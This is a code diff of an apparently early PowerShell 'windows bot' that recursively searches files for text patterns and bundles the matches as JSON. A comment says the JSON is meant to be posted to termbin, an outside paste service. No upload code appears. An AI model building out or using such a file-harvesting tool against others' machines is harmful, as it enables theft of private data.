@@ -1,10 +1,13 @@
 # windows bot 
 
+# Name:			create_json
+# Parameters:	$json_object (object json is being added to), $input_object (object to become json)
+# Return value:	returns a json object with the new values appended to it
+# Purpose:		Creates/appends json to a json object so we can post it to termbin
 function create_json($json_object, $input_object) {
-	#$input_json = $input_object
-	$json_object += $input_object | convertto-json #convertto-json -inputobject $input_object
+	$json_object += $input_object | convertto-json
 	
-	return $json_object #| convertto-json
+	return $json_object
 }
 
 # Name: 		find_string
@@ -17,26 +20,11 @@ function find_string ($string){
 	$string_b = "another etest yo"
 	$file2 = get-ChildItem -recurse | select-string -pattern $string_b | convertto-json
 	
-	#write-host "[+] file 1:"
-	#write-host $file1
-	#write-host "[+] file 2:"
-	#write-host $file2
-	#$obj = create_json $obj, $file1 #| convertto-json
-	#$obj_ = create_json $obj, $file2 #| convertto-json
-	#$dog = convertto-json $obj
-	#write-host ""
-	#$json_object = convertto-json -inputobject $file1
-	#$json_object += convertto-json -inputobject $file2
-	$magic = ""
-	$obj_ = create_json $magic, $file1
-	$obj_ = create_json $obj_, $file2
+	$tmp_json = "" # this should be done better but for now yolohaxs
+	$files = create_json $tmp_json, $file1
+	$files = create_json $files, $file2
 	write-host "[+] json object: "
-	write-host $obj_ #|convertto-json #$dog #$obj #|convertto-json
-		
-	#$obj_a = convertfrom-json -inputobject $files 
-	#$obj_a | add-member $file2
-	#write-host "maaaagic---------------"
-	#write-host $obj_a | convertto-json
+	write-host $files
 	
 	return $files
 }
